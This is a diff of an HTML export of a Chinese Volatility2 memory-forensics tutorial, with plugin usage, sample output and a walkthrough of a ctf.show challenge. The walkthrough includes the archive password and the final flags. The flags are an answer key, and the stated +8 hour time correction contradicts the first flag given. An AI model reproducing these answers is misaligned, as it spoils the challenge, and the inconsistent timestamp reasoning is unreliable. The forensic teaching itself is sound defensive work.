@@ -1,11 +1,37 @@
-<h1>内存取证</h1>
+<!DOCTYPE html><html><head>
+      <title>内存取证</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css">
+      
+      
+      
+      
+      
+      <style>
+      code[class*=language-],pre[class*=language-]{color:#333;background:0 0;font-family:Consolas,"Liberation Mono",Menlo,Courier,monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.4;-moz-tab-size:8;-o-tab-size:8;tab-size:8;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:.8em;overflow:auto;border-radius:3px;background:#f5f5f5}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal;background:#f5f5f5}.token.blockquote,.token.comment{color:#969896}.token.cdata{color:#183691}.token.doctype,.token.macro.property,.token.punctuation,.token.variable{color:#333}.token.builtin,.token.important,.token.keyword,.token.operator,.token.rule{color:#a71d5d}.token.attr-value,.token.regex,.token.string,.token.url{color:#183691}.token.atrule,.token.boolean,.token.code,.token.command,.token.constant,.token.entity,.token.number,.token.property,.token.symbol{color:#0086b3}.token.prolog,.token.selector,.token.tag{color:#63a35c}.token.attr-name,.token.class,.token.class-name,.token.function,.token.id,.token.namespace,.token.pseudo-class,.token.pseudo-element,.token.url-reference .token.variable{color:#795da3}.token.entity{cursor:help}.token.title,.token.title .token.punctuation{font-weight:700;color:#1d3e81}.token.list{color:#ed6a43}.token.inserted{background-color:#eaffea;color:#55a532}.token.deleted{background-color:#ffecec;color:#bd2c00}.token.bold{font-weight:700}.token.italic{font-style:italic}.language-json .token.property{color:#183691}.language-markup .token.tag .token.punctuation{color:#333}.language-css .token.function,code.language-css{color:#0086b3}.language-yaml .token.atrule{color:#63a35c}code.language-yaml{color:#183691}.language-ruby .token.function{color:#333}.language-markdown .token.url{color:#795da3}.language-makefile .token.symbol{color:#795da3}.language-makefile .token.variable{color:#183691}.language-makefile .token.builtin{color:#0086b3}.language-bash .token.keyword{color:#0086b3}pre[data-line]{position:relative;padding:1em 0 1em 3em}pre[data-line] .line-highlight-wrapper{position:absolute;top:0;left:0;background-color:transparent;display:block;width:100%}pre[data-line] .line-highlight{position:absolute;left:0;right:0;padding:inherit 0;margin-top:1em;background:hsla(24,20%,50%,.08);background:linear-gradient(to right,hsla(24,20%,50%,.1) 70%,hsla(24,20%,50%,0));pointer-events:none;line-height:inherit;white-space:pre}pre[data-line] .line-highlight:before,pre[data-line] .line-highlight[data-end]:after{content:attr(data-start);position:absolute;top:.4em;left:.6em;min-width:1em;padding:0 .5em;background-color:hsla(24,20%,50%,.4);color:#f4f1ef;font:bold 65%/1.5 sans-serif;text-align:center;vertical-align:.3em;border-radius:999px;text-shadow:none;box-shadow:0 1px #fff}pre[data-line] .line-highlight[data-end]:after{content:attr(data-end);top:auto;bottom:.4em}html body{font-family:'Helvetica Neue',Helvetica,'Segoe UI',Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ol,html body>ul{margin-bottom:16px}html body ol,html body ul{padding-left:2em}html body ol.no-list,html body ul.no-list{padding:0;list-style-type:none}html body ol ol,html body ol ul,html body ul ol,html body ul ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;background-color:#f0f0f0;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:700;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::after,html body code::before{letter-spacing:-.2em;content:'\00a0'}html body pre>code{padding:0;margin:0;word-break:normal;white-space:pre;background:0 0;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:after,html body pre code:before,html body pre tt:after,html body pre tt:before{content:normal}html body blockquote,html body dl,html body ol,html body p,html body pre,html body ul{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body code,html body pre{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview ul{list-style:disc}.markdown-preview ul ul{list-style:circle}.markdown-preview ul ul ul{list-style:square}.markdown-preview ol{list-style:decimal}.markdown-preview ol ol,.markdown-preview ul ol{list-style-type:lower-roman}.markdown-preview ol ol ol,.markdown-preview ol ul ol,.markdown-preview ul ol ol,.markdown-preview ul ul ol{list-style-type:lower-alpha}.markdown-preview .newpage,.markdown-preview .pagebreak{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center!important}.markdown-preview:not([data-for=preview]) .code-chunk .code-chunk-btn-group{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .status{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .output-div{margin-bottom:16px}.markdown-preview .md-toc{padding:0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link div,.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}.markdown-preview .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0;min-height:100vh}@media screen and (min-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{font-size:14px!important;padding:1em}}@media print{html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc{padding:0 16px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link div,html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% - 300px);padding:2em calc(50% - 457px - 300px / 2);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
+/* Please visit the URL below for more information: */
+/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */
+
+      </style>
+      <!-- The content below will be included at the end of the <head> element. --><script type="text/javascript">
+  document.addEventListener("DOMContentLoaded", function () {
+    // your code here
+  });
+</script></head><body for="html-export">
+    
+    
+      <div class="crossnote markdown-preview  ">
+      
+<h1 id="内存取证">内存取证 </h1>
 <p>工具：Volatility2</p>
 <p>软件可以通过github下载 需要配置python2与pip2环境</p>
 <p><code>https://github.com/volatilityfoundation/volatility</code></p>
-<p><img src="https://camo.githubusercontent.com/eeafeeaf1e41ff270b6f855ae44bfd1561649ae5395ca3a11c8c951cbc7ba58b/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f37613838393866636331623134623535623764343831306333306666353638392e706e67" alt="" /></p>
+<p><img src="https://camo.githubusercontent.com/eeafeeaf1e41ff270b6f855ae44bfd1561649ae5395ca3a11c8c951cbc7ba58b/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f37613838393866636331623134623535623764343831306333306666353638392e706e67" alt=""></p>
 <p>如果系统为ArchLinux可以通过aur安装</p>
 <p><code>yay python2-volatility</code></p>
-<h2>工具使用方法</h2>
+<h2 id="工具使用方法">工具使用方法 </h2>
 <table>
 <thead>
 <tr>
@@ -86,70 +112,70 @@
 <td>timeliner</td>
 <td>创建内存中的痕迹时间线</td>
 </tr>
+<tr>
+<td>nodepad</td>
+<td>查看记事本当前显示的文本</td>
+</tr>
 </tbody>
 </table>
-<h2>详细使用</h2>
+<h2 id="详细使用">详细使用 </h2>
 <p>无论拿到扫描样子的题目第一步都是查看系统镜像，利用imageinfo查看详细镜像信息</p>
 <p><code>vol.py -f 1.vmem imageinfo</code></p>
-<pre><code class="language-shell">INFO    : volatility.debug    : Determining profile based on KDBG search...
-          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
-                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
-                     AS Layer2 : FileAddressSpace (/home/neko/Desktop/1.vmem)
-                      PAE type : No PAE
-                           DTB : 0x187000L
-                          KDBG : 0xf80003e520a0L
-          Number of Processors : 1
-     Image Type (Service Pack) : 1
-                KPCR for CPU 0 : 0xfffff80003e53d00L
-             KUSER_SHARED_DATA : 0xfffff78000000000L
-           Image date and time : 2021-04-21 07:24:54 UTC+0000
-     Image local date and time : 2021-04-21 15:24:54 +0800
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>INFO    <span class="token builtin class-name">:</span> volatility.debug    <span class="token builtin class-name">:</span> Determining profile based on KDBG search<span class="token punctuation">..</span>.
+          Suggested Profile<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token builtin class-name">:</span> Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
+                     AS Layer1 <span class="token builtin class-name">:</span> WindowsAMD64PagedMemory <span class="token punctuation">(</span>Kernel AS<span class="token punctuation">)</span>
+                     AS Layer2 <span class="token builtin class-name">:</span> FileAddressSpace <span class="token punctuation">(</span>/home/neko/Desktop/1.vmem<span class="token punctuation">)</span>
+                      PAE <span class="token builtin class-name">type</span> <span class="token builtin class-name">:</span> No PAE
+                           DTB <span class="token builtin class-name">:</span> 0x187000L
+                          KDBG <span class="token builtin class-name">:</span> 0xf80003e520a0L
+          Number of Processors <span class="token builtin class-name">:</span> <span class="token number">1</span>
+     Image Type <span class="token punctuation">(</span>Service Pack<span class="token punctuation">)</span> <span class="token builtin class-name">:</span> <span class="token number">1</span>
+                KPCR <span class="token keyword keyword-for">for</span> CPU <span class="token number">0</span> <span class="token builtin class-name">:</span> 0xfffff80003e53d00L
+             KUSER_SHARED_DATA <span class="token builtin class-name">:</span> 0xfffff78000000000L
+           Image <span class="token function">date</span> and <span class="token function">time</span> <span class="token builtin class-name">:</span> <span class="token number">2021</span>-04-21 07:24:54 UTC+0000
+     Image <span class="token builtin class-name">local</span> <span class="token function">date</span> and <span class="token function">time</span> <span class="token builtin class-name">:</span> <span class="token number">2021</span>-04-21 <span class="token number">15</span>:24:54 +0800
 
-</code></pre>
-<p>通过查看Suggested Profile(s)字段确定需要使用的内存镜像分析配置文件</p>
+</code></pre><p>通过查看Suggested Profile(s)字段确定需要使用的内存镜像分析配置文件</p>
 <p><code>vol.py -f 1.vmem --profile=Win7SP1x64 pslist</code></p>
-<pre><code class="language-shell">Volatility Foundation Volatility Framework 2.6
-Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                        
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>Volatility Foundation Volatility Framework <span class="token number">2.6</span>
+Offset<span class="token punctuation">(</span>V<span class="token punctuation">)</span>          Name                    PID   <span class="token environment constant">PPID</span>   Thds     Hnds   Sess  Wow64 Start                          Exit                          
 ------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
-0xfffffa8018db89e0 System                    4      0     74      562 ------      0 2021-04-21 07:16:07 UTC+0000                               
-0xfffffa801a449040 smss.exe                224      4      2       29 ------      0 2021-04-21 07:16:07 UTC+0000                               
-0xfffffa801ab72b30 csrss.exe               308    300      9      473      0      0 2021-04-21 07:16:08 UTC+0000                               
-0xfffffa8018dbd5f0 wininit.exe             344    300      3       75      0      0 2021-04-21 07:16:08 UTC+0000                               
-0xfffffa801ab82060 csrss.exe               356    336      8      315      1      0 2021-04-21 07:16:08 UTC+0000                               
-0xfffffa801abbf060 winlogon.exe            404    336      7      131      1      0 2021-04-21 07:16:08 UTC+0000                                 ..........
-</code></pre>
-<p>值得注意的是pid数字，可以通过它dump出内存中的程序</p>
+0xfffffa8018db89e0 System                    <span class="token number">4</span>      <span class="token number">0</span>     <span class="token number">74</span>      <span class="token number">562</span> ------      <span class="token number">0</span> <span class="token number">2021</span>-04-21 07:16:07 UTC+0000                                 
+0xfffffa801a449040 smss.exe                <span class="token number">224</span>      <span class="token number">4</span>      <span class="token number">2</span>       <span class="token number">29</span> ------      <span class="token number">0</span> <span class="token number">2021</span>-04-21 07:16:07 UTC+0000                                 
+0xfffffa801ab72b30 csrss.exe               <span class="token number">308</span>    <span class="token number">300</span>      <span class="token number">9</span>      <span class="token number">473</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2021</span>-04-21 07:16:08 UTC+0000                                 
+0xfffffa8018dbd5f0 wininit.exe             <span class="token number">344</span>    <span class="token number">300</span>      <span class="token number">3</span>       <span class="token number">75</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2021</span>-04-21 07:16:08 UTC+0000                                 
+0xfffffa801ab82060 csrss.exe               <span class="token number">356</span>    <span class="token number">336</span>      <span class="token number">8</span>      <span class="token number">315</span>      <span class="token number">1</span>      <span class="token number">0</span> <span class="token number">2021</span>-04-21 07:16:08 UTC+0000                                 
+0xfffffa801abbf060 winlogon.exe            <span class="token number">404</span>    <span class="token number">336</span>      <span class="token number">7</span>      <span class="token number">131</span>      <span class="token number">1</span>      <span class="token number">0</span> <span class="token number">2021</span>-04-21 07:16:08 UTC+0000                                 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
+</code></pre><p>值得注意的是pid数字，可以通过它dump出内存中的程序</p>
 <p><code>vol.py -f 1.vmem --profile=Win7SP1x64 procdump -p 224 -D ./</code></p>
 <p>p：就是pid进程号</p>
 <p>D：提取程序后保存的位置，./就是保存到当前位置</p>
-<pre><code class="language-shell">Volatility Foundation Volatility Framework 2.6
-Process(V)         ImageBase          Name                 Result
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>Volatility Foundation Volatility Framework <span class="token number">2.6</span>
+Process<span class="token punctuation">(</span>V<span class="token punctuation">)</span>         ImageBase          Name                 Result
 ------------------ ------------------ -------------------- ------
 0xfffffa801a449040 0x0000000048490000 smss.exe             OK: executable.224.exe
-</code></pre>
-<h3>检索终端信息</h3>
+</code></pre><h3 id="检索终端信息">检索终端信息 </h3>
 <p>vol中可以使用cmdscan扫描内存镜像中已经执行的cmd命令</p>
 <p><code>vol.py -f 1.vmem --profile=Win7SP1x64 cmdscan</code></p>
-<pre><code class="language-shell">Volatility Foundation Volatility Framework 2.6
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>Volatility Foundation Volatility Framework <span class="token number">2.6</span>
 **************************************************
-CommandProcess: conhost.exe Pid: 3400
+CommandProcess: conhost.exe Pid: <span class="token number">3400</span>
 CommandHistory: 0x317540 Application: cmd.exe Flags: Allocated
-CommandCount: 0 LastAdded: -1 LastDisplayed: -1
-FirstCommand: 0 CommandCountMax: 50
+CommandCount: <span class="token number">0</span> LastAdded: <span class="token parameter variable">-1</span> LastDisplayed: <span class="token parameter variable">-1</span>
+FirstCommand: <span class="token number">0</span> CommandCountMax: <span class="token number">50</span>
 ProcessHandle: 0x5c
 **************************************************
-CommandProcess: conhost.exe Pid: 3400
+CommandProcess: conhost.exe Pid: <span class="token number">3400</span>
 CommandHistory: 0x317720 Application: csrss.exe Flags: Allocated
-CommandCount: 0 LastAdded: -1 LastDisplayed: -1
-FirstCommand: 0 CommandCountMax: 50
+CommandCount: <span class="token number">0</span> LastAdded: <span class="token parameter variable">-1</span> LastDisplayed: <span class="token parameter variable">-1</span>
+FirstCommand: <span class="token number">0</span> CommandCountMax: <span class="token number">50</span>
 ProcessHandle: 0x88
-</code></pre>
-<p>这个镜像并没有详细信息，可以看一下其他镜像</p>
-<p><img src="https://camo.githubusercontent.com/174849bf730a63d69775ef2744ca8922dba97719f3da5435e1e2f7f1fd4fefa3/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f31613239346533333533353334643533616366626334643638313933353230332e706e67" alt="" /></p>
-<h2>题目实例</h2>
-<p>题目地址：https://ctf.show/challenges#JiaJia-CP-1-1734</p>
+</code></pre><p>这个镜像并没有详细信息，可以看一下其他镜像</p>
+<p><img src="https://camo.githubusercontent.com/174849bf730a63d69775ef2744ca8922dba97719f3da5435e1e2f7f1fd4fefa3/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f31613239346533333533353334643533616366626334643638313933353230332e706e67" alt=""></p>
+<h2 id="题目实例">题目实例 </h2>
+<p>题目地址：<a href="https://ctf.show/challenges#JiaJia-CP-1-1734">https://ctf.show/challenges#JiaJia-CP-1-1734</a></p>
 <p>详细：</p>
-<pre><code>这是部分人熟知的**刘佳佳**同学的电脑，她今年21岁已在公司里实习。但是佳佳经常摸鱼被老板训斥说：&quot;你怎么摸得下去的&quot;。因此佳佳还会经常将未完成的工作带到家里去完成(~~老板不留她加班属实有点离谱~~。但最近佳佳一天摸鱼的时间达到了25小时，这令老板非常不爽。于是🐕老板悄悄的植入了一个软件并在后台获取了佳佳**电脑的内存信息**。由于老板也是个懒🐕于是叫你来找一下老板想要的佳佳电脑的信息。作为十年老粉的CTFer们如果不是因为要找到flag一定不想帮老板来看佳佳的电脑内存信息吧，于是你也只能来帮助老板寻找佳佳电脑里的信息。~~电脑里面没有奇奇怪怪的东西，不要乱翻浪费时间~~
+<pre data-role="codeBlock" data-info="" class="language-text text"><code>这是部分人熟知的**刘佳佳**同学的电脑，她今年21岁已在公司里实习。但是佳佳经常摸鱼被老板训斥说："你怎么摸得下去的"。因此佳佳还会经常将未完成的工作带到家里去完成(~~老板不留她加班属实有点离谱~~。但最近佳佳一天摸鱼的时间达到了25小时，这令老板非常不爽。于是🐕老板悄悄的植入了一个软件并在后台获取了佳佳**电脑的内存信息**。由于老板也是个懒🐕于是叫你来找一下老板想要的佳佳电脑的信息。作为十年老粉的CTFer们如果不是因为要找到flag一定不想帮老板来看佳佳的电脑内存信息吧，于是你也只能来帮助老板寻找佳佳电脑里的信息。~~电脑里面没有奇奇怪怪的东西，不要乱翻浪费时间~~
 题目解压密码：Th1s_15_p@SsW0rd_u_n3ver_kn0w_b3f0re_BLB_St4rt
 
 可通过验证压缩包md5值查看附件是否损坏：de3b3febacdfa20d255e1014cd204a35
@@ -167,27 +193,25 @@ google cloud链接https://drive.google.com/file/d/1UvMTUXV76F-qh1FGtUpE_duo3V7cg
 du盘链接https://pan.baidu.com/s/1hVFPJhU8B4g8Kyy0ssDSLw?pwd=show
 
 提取码：show
-</code></pre>
-<p>先看题目，我们需要找出镜像文件中佳佳的用户名与最后一次运行计算机的时间，二者结合计算md5</p>
+</code></pre><p>先看题目，我们需要找出镜像文件中佳佳的用户名与最后一次运行计算机的时间，二者结合计算md5</p>
 <p>先看第一题，需要我们找出Users下的佳佳的用户名，这里可以用到filescan插件配合grep输出来查询</p>
 <p><code>vol.py -f JiaJia_Co.raw --profile=Win7SP1x64 filescan | grep Users</code></p>
-<pre><code class="language-shell">0x000000013fdd8930     16      0 RW---- \Device\HarddiskVolume1\Users\JiaJia\AppData\Roaming\Telegram Desktop\Updater.exep
-0x000000013fdda070     16      0 R--r-- \Device\HarddiskVolume1\Users\JiaJia\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\6025C34CC5B36C4156C40F3B0D99B6AB
-0x000000013fde26a0     16      0 RW---- \Device\HarddiskVolume1\Users\JiaJia\AppData\Roaming\Telegram Desktop\Telegram.exe
-0x000000013fde46d0      3      0 R--rw- \Device\HarddiskVolume1\Users\JiaJia\AppData\Local\Google\Chrome\User Data\Safe Browsing\UrlSoceng.store
-0x000000013fde4930     16      0 R--r-- \Device\HarddiskVolume1\Users\JiaJia\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\F07644E38ED7C9F37D11EEC6D4335E02_E81D30836CB09660A7E3C5D921621623
-0x000000013fded350     16      0 RW-rw- 
-</code></pre>
-<p><img src="https://picdm.sunbangyan.cn/2023/11/23/d61815de9a845dea4420fe8809ca84a4.jpeg" alt="" /></p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>0x000000013fdd8930     <span class="token number">16</span>      <span class="token number">0</span> RW---- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>JiaJia<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Telegram Desktop<span class="token punctuation">\</span>Updater.exep
+0x000000013fdda070     <span class="token number">16</span>      <span class="token number">0</span> R--r-- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>JiaJia<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>LocalLow<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>CryptnetUrlCache<span class="token punctuation">\</span>MetaData<span class="token punctuation">\</span>6025C34CC5B36C4156C40F3B0D99B6AB
+0x000000013fde26a0     <span class="token number">16</span>      <span class="token number">0</span> RW---- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>JiaJia<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Telegram Desktop<span class="token punctuation">\</span>Telegram.exe
+0x000000013fde46d0      <span class="token number">3</span>      <span class="token number">0</span> R--rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>JiaJia<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Google<span class="token punctuation">\</span>Chrome<span class="token punctuation">\</span>User Data<span class="token punctuation">\</span>Safe Browsing<span class="token punctuation">\</span>UrlSoceng.store
+0x000000013fde4930     <span class="token number">16</span>      <span class="token number">0</span> R--r-- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>JiaJia<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>LocalLow<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>CryptnetUrlCache<span class="token punctuation">\</span>MetaData<span class="token punctuation">\</span>F07644E38ED7C9F37D11EEC6D4335E02_E81D30836CB09660A7E3C5D921621623
+0x000000013fded350     <span class="token number">16</span>      <span class="token number">0</span> RW-rw- 
+</code></pre><p><img src="https://picdm.sunbangyan.cn/2023/11/23/d61815de9a845dea4420fe8809ca84a4.jpeg" alt=""></p>
 <p>可知用户名为JiaJia</p>
 <p>第二题需要我们找出计算器——也就是calc.exe，我之前的思路是查询pslist或者filescan过滤出calc字符，结果不行</p>
 <p>pslist完全没有输出	filescan倒是有输出了但是没有时间信息</p>
-<p><img src="https://picdl.sunbangyan.cn/2023/11/23/d71a8ffcc424d0b6f1c1af70621c863e.jpeg" alt="" /></p>
+<p><img src="https://picdl.sunbangyan.cn/2023/11/23/d71a8ffcc424d0b6f1c1af70621c863e.jpeg" alt=""></p>
 <p>后续在大佬的点拨下找到了这样一个命令</p>
-<p><img src="https://picss.sunbangyan.cn/2023/11/23/444963a243f053b64eab22e9d1e6fc23.jpeg" alt="" /></p>
+<p><img src="https://picss.sunbangyan.cn/2023/11/23/444963a243f053b64eab22e9d1e6fc23.jpeg" alt=""></p>
 <p>timeliner可以梳理出内存中信息的时间线 配合过滤命令 就是</p>
 <p><code>vol.py -f JiaJia_Co.raw --profile=Win7SP1x64 timeliner | grep calc.exe</code></p>
-<p><img src="https://picss.sunbangyan.cn/2023/11/23/9d3d4593d99b481df96c6ebc46e2bd27.jpeg" alt="" /></p>
+<p><img src="https://picss.sunbangyan.cn/2023/11/23/9d3d4593d99b481df96c6ebc46e2bd27.jpeg" alt=""></p>
 <p>得到时间信息：2021-12-10 12:15:47</p>
 <p>但是因为windows和linux的差异时间相差了8个小时，也就是时间需要+8</p>
 <p>因此正确时间应该是：2021-12-10 20:15:47</p>
@@ -196,3 +220,161 @@ du盘链接https://pan.baidu.com/s/1hVFPJhU8B4g8Kyy0ssDSLw?pwd=show
 <p>ctfshow{JiaJia_2021-12-10_12:15:47}</p>
 <p>ctfshow{079249e3fc743bc2d0789f224e451ffd}</p>
